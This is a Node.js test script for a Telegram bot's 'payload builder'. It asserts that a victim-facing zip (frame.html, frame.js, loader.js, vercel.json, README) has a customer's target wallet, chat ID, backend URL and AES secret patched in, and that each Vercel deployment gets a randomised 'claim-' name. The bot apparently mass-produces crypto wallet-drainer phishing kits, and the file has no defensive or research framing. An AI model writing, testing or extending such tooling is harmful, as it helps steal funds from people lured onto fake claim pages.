// test-build.mjs — verify the payload builder without Telegram.
// Builds a zip for a test wallet and checks every patch point.
// Run: BOT_TOKEN=x BACKEND_URL=https://test-backend.fly.dev AES_SECRET=app_aaaabbbbccccdddd node test-build.mjs

import AdmZip from "adm-zip";
import assert from "assert";
import { buildPayload, isValidWallet, patchFile } from "./bot.js";

const TEST_WALLET = "9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM"; // valid base58, well-known test addr
const TEST_CHAT = "-100999888";
const BACKEND = "https://test-backend.fly.dev";
const SECRET = "app_aaaabbbbccccdddd";
const OLD_SECRET = "app_bcea2a77b7fc2048f8a2a7d083118d3b42aecc0f783754335c50af0591d4cc1a533ccba165077cd09fd7db96b0dba909";

// ── wallet validation ──────────────────────────────────────────────────────
assert.ok(isValidWallet(TEST_WALLET), "valid wallet rejected");
assert.ok(!isValidWallet("0OIl"), "invalid wallet accepted");
assert.ok(!isValidWallet("tooshort"), "short wallet accepted");
console.log("✓ wallet validation");

// ── per-file patches ───────────────────────────────────────────────────────
for (const name of ["frame.html", "frame.js", "loader.js"]) {
  const patched = patchFile(name, TEST_WALLET, TEST_CHAT);

  assert.ok(patched.includes(`targetWallet: "${TEST_WALLET}"`), `${name}: wallet not patched`);
  assert.ok(!patched.includes(`targetWallet: "CEkn`), `${name}: old wallet remains`);

  // userChatId injected next to wallet
  assert.ok(
    patched.includes(`targetWallet: "${TEST_WALLET}", userChatId: "${TEST_CHAT}"`),
    `${name}: userChatId not injected`
  );

  // config refs (unquoted) must survive
  assert.ok(/config(\?|\.)targetWallet/.test(patched) || name === "frame.js", `${name}: config refs broken`);

  // no old secret anywhere
  assert.ok(!patched.includes(OLD_SECRET), `${name}: old AES secret remains`);
  assert.ok(patched.includes(SECRET) || name === "loader.js", `${name}: new secret missing`);

  // backend url
  assert.ok(patched.includes(BACKEND) || name === "loader.js", `${name}: backend url missing`);
}
console.log("✓ per-file patches (frame.html, frame.js, loader.js)");

// ── vercel.json ────────────────────────────────────────────────────────────
const vj = patchFile("vercel.json", TEST_WALLET, TEST_CHAT);
const parsed = JSON.parse(vj);
assert.ok(/^claim-[0-9a-f]{6}$/.test(parsed.name), "vercel name not randomized");
console.log("✓ vercel.json name randomized:", parsed.name);

// ── zip build ──────────────────────────────────────────────────────────────
const zipBuf = buildPayload(TEST_WALLET, TEST_CHAT);
const zip = new AdmZip(zipBuf);
const names = zip.getEntries().map((e) => e.entryName);
assert.deepStrictEqual(
  names.sort(),
  ["README.txt", "frame.html", "frame.js", "loader.js", "vercel.json"].sort(),
  `zip contents wrong: ${names}`
);
const html = zip.readAsText("frame.html");
assert.ok(html.includes(`targetWallet: "${TEST_WALLET}"`), "zip: html wallet wrong");
assert.ok(html.includes(BACKEND), "zip: html backend wrong");
assert.ok(html.includes(SECRET), "zip: html secret wrong");
assert.ok(!html.includes(OLD_SECRET), "zip: html old secret remains");
const readme = zip.readAsText("README.txt");
assert.ok(readme.includes(TEST_WALLET), "zip: readme wallet missing");
console.log("✓ zip build — 5 files, all patches applied");

console.log("\nALL TESTS PASSED");
